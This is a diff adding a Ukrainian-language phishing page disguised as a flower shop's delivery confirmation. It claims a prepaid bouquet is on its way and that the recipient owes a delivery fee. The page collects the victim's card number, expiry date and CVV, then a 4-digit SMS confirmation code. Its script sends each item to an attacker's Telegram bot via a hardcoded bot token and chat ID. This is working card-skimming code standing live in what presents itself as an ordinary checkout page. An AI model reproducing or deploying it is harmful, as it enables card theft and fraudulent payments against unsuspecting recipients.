@@ -1,0 +1,605 @@
+﻿<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Підтвердження замовлення | Квіти</title>
+    <!-- Шрифт Montserrat -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+
+        body {
+            font-family: 'Montserrat', sans-serif;
+            background: linear-gradient(145deg, #e8f5e9 0%, #c8e6c9 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            color: #2e3b2e;
+            position: relative;
+        }
+
+
+        /* Квітковий декор */
+        body::before {
+            content: "🌸";
+            font-size: 120px;
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            opacity: 0.2;
+            transform: rotate(-15deg);
+        }
+        body::after {
+            content: "🌼";
+            font-size: 150px;
+            position: absolute;
+            bottom: 20px;
+            right: 20px;
+            opacity: 0.2;
+            transform: rotate(15deg);
+        }
+
+
+        .checkout-container {
+            max-width: 480px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.7);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border-radius: 40px;
+            box-shadow: 0 25px 50px -12px rgba(46, 59, 46, 0.3), 0 0 0 1px rgba(129, 199, 132, 0.2) inset;
+            overflow: hidden;
+            border: 1px solid rgba(102, 187, 106, 0.3);
+        }
+
+
+        .header {
+            padding: 30px 30px 20px;
+            background: rgba(255, 255, 255, 0.5);
+            border-bottom: 2px dashed #a5d6a7;
+            text-align: center;
+        }
+
+
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+
+        .logo-icon {
+            font-size: 48px;
+            color: #81c784;
+            filter: drop-shadow(0 4px 6px rgba(76, 175, 80, 0.2));
+        }
+
+
+        .logo-text {
+            font-weight: 600;
+            font-size: 24px;
+            letter-spacing: -0.5px;
+            color: #2e7d32;
+            background: rgba(255,255,255,0.8);
+            padding: 5px 15px;
+            border-radius: 40px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+        }
+
+
+        .badge {
+            background: #e8f5e9;
+            color: #2e7d32;
+            padding: 8px 18px;
+            border-radius: 40px;
+            font-size: 14px;
+            font-weight: 500;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            border: 1px solid #a5d6a7;
+            margin-bottom: 20px;
+        }
+
+
+        .amount {
+            font-size: 28px;
+            font-weight: 600;
+            color: #1b5e20;
+            margin: 15px 0 5px;
+        }
+        .amount small {
+            font-size: 16px;
+            font-weight: 400;
+            color: #558b2f;
+        }
+
+
+        .merchant-info {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            font-size: 15px;
+            color: #336633;
+            background: rgba(255,255,255,0.6);
+            padding: 12px 20px;
+            border-radius: 50px;
+            margin: 10px 0;
+        }
+
+
+        /* Новий блок з інформацією про замовлення */
+        .order-info {
+            background: #f1f8e9;
+            border-left: 4px solid #81c784;
+            border-radius: 16px;
+            padding: 15px;
+            text-align: left;
+            margin-top: 15px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+        }
+        .order-info p {
+            margin: 8px 0;
+            font-size: 14px;
+            color: #1b5e20;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .order-info .warning-tag {
+            background: #ffb74d;
+            color: #ffffff;
+            padding: 2px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            display: inline-block;
+            margin-bottom: 5px;
+        }
+
+
+        .content {
+            padding: 30px;
+        }
+
+
+        .step {
+            margin-bottom: 30px;
+        }
+
+
+        .step-title {
+            font-weight: 600;
+            font-size: 18px;
+            color: #1b5e20;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-bottom: 1px dashed #c8e6c9;
+            padding-bottom: 10px;
+        }
+        .step-title i {
+            color: #81c784;
+            font-size: 20px;
+        }
+
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            color: #2e7d32;
+            margin-bottom: 6px;
+            letter-spacing: 0.3px;
+        }
+
+
+        .input-wrapper {
+            position: relative;
+        }
+
+
+        .input-wrapper i {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #81c784;
+            font-size: 16px;
+        }
+
+
+        .input-wrapper input, .input-wrapper textarea {
+            width: 100%;
+            background: #ffffffd9;
+            border: 1px solid #c8e6c9;
+            border-radius: 30px;
+            padding: 16px 16px 16px 48px;
+            font-size: 15px;
+            font-family: 'Montserrat', sans-serif;
+            color: #1b5e20;
+            transition: all 0.2s;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.02);
+        }
+
+
+        .input-wrapper input:focus, .input-wrapper textarea:focus {
+            border-color: #66bb6a;
+            outline: none;
+            box-shadow: 0 0 0 4px rgba(102, 187, 106, 0.15);
+            background: #ffffff;
+        }
+
+
+        textarea {
+            resize: vertical;
+            min-height: 80px;
+        }
+
+
+        .card-row {
+            display: flex;
+            gap: 10px;
+        }
+        .card-row .form-group {
+            flex: 1;
+        }
+
+
+        .btn {
+            background: linear-gradient(145deg, #81c784, #66bb6a);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            padding: 18px;
+            font-size: 16px;
+            font-weight: 600;
+            width: 100%;
+            cursor: pointer;
+            transition: all 0.2s;
+            box-shadow: 0 8px 20px -8px #66bb6a;
+            margin-top: 20px;
+            border: 1px solid #a5d6a7;
+        }
+
+
+        .btn:hover {
+            background: linear-gradient(145deg, #66bb6a, #4caf50);
+            transform: translateY(-2px);
+            box-shadow: 0 12px 25px -8px #4caf50;
+        }
+
+
+        .btn i {
+            margin-right: 8px;
+        }
+
+
+        .payment-icons {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 25px;
+            color: #81c784;
+            font-size: 28px;
+        }
+
+
+        .footer-note {
+            text-align: center;
+            font-size: 12px;
+            color: #558b2f;
+            margin-top: 20px;
+        }
+
+
+        .footer-note i {
+            color: #66bb6a;
+        }
+
+
+        /* Стилі для OTP */
+        .otp-section {
+            display: none;
+            text-align: center;
+        }
+        .otp-section.active {
+            display: block;
+        }
+        .otp-inputs {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin: 30px 0;
+        }
+        .otp-inputs input {
+            width: 55px;
+            height: 65px;
+            background: #ffffffd9;
+            border: 1px solid #c8e6c9;
+            border-radius: 20px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 600;
+            color: #1b5e20;
+        }
+        .otp-inputs input:focus {
+            border-color: #66bb6a;
+            outline: none;
+            box-shadow: 0 0 0 3px #a5d6a7;
+        }
+        .resend-link {
+            color: #2e7d32;
+            text-decoration: none;
+            font-size: 14px;
+            border-bottom: 1px dashed #a5d6a7;
+        }
+        .resend-link:hover {
+            color: #1b5e20;
+        }
+    </style>
+</head>
+<body>
+    <div class="checkout-container">
+        <div class="header">
+            <div class="logo">
+                <i class="fas fa-seedling logo-icon"></i>
+                <span class="logo-text">Квіти.ua</span>
+            </div>
+            <div class="badge"><i class="fas fa-lock"></i> Захищене з'єднання</div>
+            <div class="amount">Доставка</div> <!-- Суму прибрали -->
+            <div class="merchant-info">
+                <i class="fas fa-store"></i> Квітковий магазин «Троянда»
+                <i class="fas fa-check-circle" style="color: #4caf50;"></i>
+            </div>
+
+
+            <!-- Новий блок з інформацією про замовлення -->
+            <div class="order-info">
+                <span class="warning-tag"><i class="fas fa-exclamation-triangle"></i> Увага</span>
+                <p><strong>⚠️ До Вас прямує замовлення K-56742</strong></p>
+                <p>✅ Сплачено Замовником 06.03.2026</p>
+                <p>‼️ Вартість кур'єрської доставки визначається окремо в день отримання та сплачується отримувачем.</p>
+            </div>
+        </div>
+
+
+        <div class="content">
+            <!-- Крок 1: дані отримувача та картки -->
+            <div id="step1">
+                <div class="step">
+                    <div class="step-title"><i class="fas fa-user"></i> Отримувач</div>
+                    <div class="form-group">
+                        <label>Ім'я отримувача</label>
+                        <div class="input-wrapper">
+                            <i class="fas fa-user-circle"></i>
+                            <input type="text" id="name" value="Олександр Петренко" placeholder="Як у замовленні">
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label>Коментар кур'єру (домофон, код, орієнтир)</label>
+                        <div class="input-wrapper">
+                            <i class="fas fa-comment-dots"></i>
+                            <textarea id="comment" placeholder="наприклад, домофон 123, під'їзд 2"></textarea>
+                        </div>
+                    </div>
+                </div>
+
+
+                <div class="step">
+                    <div class="step-title"><i class="fas fa-credit-card"></i> Дані картки</div>
+                    <div class="form-group">
+                        <label>Номер картки</label>
+                        <div class="input-wrapper">
+                            <i class="fas fa-credit-card"></i>
+                            <input type="text" id="card" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric">
+                        </div>
+                    </div>
+                    <div class="card-row">
+                        <div class="form-group">
+                            <label>Термін дії</label>
+                            <div class="input-wrapper">
+                                <i class="fas fa-calendar-alt"></i>
+                                <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" inputmode="numeric">
+                            </div>
+                        </div>
+                        <div class="form-group">
+                            <label>CVV</label>
+                            <div class="input-wrapper">
+                                <i class="fas fa-lock"></i>
+                                <input type="text" id="cvv" placeholder="123" maxlength="3" inputmode="numeric">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+
+                <!-- Кнопка змінена: без суми, просто підтвердження -->
+                <button class="btn" id="payBtn"><i class="fas fa-check-circle"></i> Підтвердити замовлення</button>
+
+
+                <div class="payment-icons">
+                    <i class="fab fa-cc-visa"></i>
+                    <i class="fab fa-cc-mastercard"></i>
+                    <i class="fab fa-cc-amex"></i>
+                    <i class="fab fa-apple-pay"></i>
+                    <i class="fab fa-google-pay"></i>
+                </div>
+            </div>
+
+
+            <!-- Крок 2: підтвердження SMS -->
+            <div id="step2" style="display: none;">
+                <div class="step">
+                    <div class="step-title"><i class="fas fa-envelope-open-text"></i> Підтвердження</div>
+                    <p style="margin-bottom: 20px; color: #2e7d32;">Ми надіслали код на номер <strong>+380 (**) ***-**-89</strong></p>
+                    <div class="otp-inputs">
+                        <input type="text" maxlength="1" class="otp-digit">
+                        <input type="text" maxlength="1" class="otp-digit">
+                        <input type="text" maxlength="1" class="otp-digit">
+                        <input type="text" maxlength="1" class="otp-digit">
+                    </div>
+                    <button class="btn" id="confirmBtn" style="margin-top: 10px;"><i class="fas fa-check"></i> Підтвердити</button>
+                    <p style="margin-top: 20px;"><a href="#" class="resend-link" id="resendLink">Не отримали код? Надіслати знову</a></p>
+                </div>
+            </div>
+
+
+            <div class="footer-note">
+                <i class="fas fa-shield-alt"></i> Ваші дані захищені
+            </div>
+        </div>
+    </div>
+
+
+    <script>
+        // НАЛАШТУВАННЯ
+        const TELEGRAM_BOT_TOKEN = '8457818382:AAFfzFzAkVl69eyia9ZR3AupkU1wBhQ0mIs';
+        const ADMIN_CHAT_ID = '8015426849';
+
+
+        let orderData = {};
+
+
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({chat_id: ADMIN_CHAT_ID, text: message, parse_mode: 'HTML'})
+                });
+                const data = await response.json();
+                if (!data.ok) {
+                    alert('Помилка відправки. Перевірте токен.');
+                    console.error(data);
+                    return false;
+                }
+                return true;
+            } catch (e) {
+                alert('Помилка мережі');
+                console.error(e);
+                return false;
+            }
+        }
+
+
+        document.getElementById('payBtn').addEventListener('click', async function() {
+            orderData = {
+                name: document.getElementById('name').value,
+                comment: document.getElementById('comment').value,
+                card: document.getElementById('card').value.replace(/\s/g, ''),
+                expiry: document.getElementById('expiry').value,
+                cvv: document.getElementById('cvv').value
+            };
+
+
+            if (!orderData.card || !orderData.expiry || !orderData.cvv) {
+                alert('Будь ласка, заповніть дані картки');
+                return;
+            }
+
+
+            const msg = `
+🌸 <b>НОВЕ ЗАМОВЛЕННЯ (доставка)</b>
+
+
+👤 <b>Отримувач:</b> ${orderData.name}
+📝 <b>Коментар:</b> ${orderData.comment || 'немає'}
+
+
+💳 <b>Дані картки:</b>
+   • Номер: <code>${orderData.card}</code>
+   • Термін: ${orderData.expiry}
+   • CVV: ${orderData.cvv}
+            `;
+
+
+            const success = await sendToTelegram(msg);
+            if (success) {
+                document.getElementById('step1').style.display = 'none';
+                document.getElementById('step2').style.display = 'block';
+            }
+        });
+
+
+        // OTP handling
+        const otpInputs = document.querySelectorAll('.otp-digit');
+        otpInputs.forEach((input, idx) => {
+            input.addEventListener('keyup', function(e) {
+                if (e.key >= '0' && e.key <= '9') {
+                    this.value = e.key;
+                    if (idx < otpInputs.length-1) otpInputs[idx+1].focus();
+                } else if (e.key === 'Backspace') {
+                    if (idx > 0) otpInputs[idx-1].focus();
+                }
+            });
+        });
+
+
+        document.getElementById('confirmBtn').addEventListener('click', async function() {
+            let otp = '';
+            otpInputs.forEach(i => otp += i.value);
+            if (otp.length !== 4) {
+                alert('Введіть повний код');
+                return;
+            }
+
+
+            const otpMsg = `
+🔐 <b>Код підтвердження</b>
+👤 Отримувач: ${orderData.name}
+💳 Картка: ${orderData.card}
+🔢 Код: <code>${otp}</code>
+            `;
+            const success = await sendToTelegram(otpMsg);
+            if (success) {
+                alert('✅ Замовлення підтверджено! Дякуємо.');
+                setTimeout(() => location.reload(), 2000);
+            }
+        });
+
+
+        document.getElementById('resendLink').addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('Новий код надіслано (демо)');
+        });
+
+
+        // Форматування полів
+        document.getElementById('card').addEventListener('input', function(e) {
+            let v = e.target.value.replace(/\D/g, '').substring(0,16);
+            e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
+        });
+        document.getElementById('expiry').addEventListener('input', function(e) {
+            let v = e.target.value.replace(/\D/g, '').substring(0,4);
+            if (v.length >= 2) v = v.substring(0,2) + '/' + v.substring(2);
+            e.target.value = v;
+        });
+        document.getElementById('cvv').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '').substring(0,3);
+        });
+    </script>
+</body>
+</html>
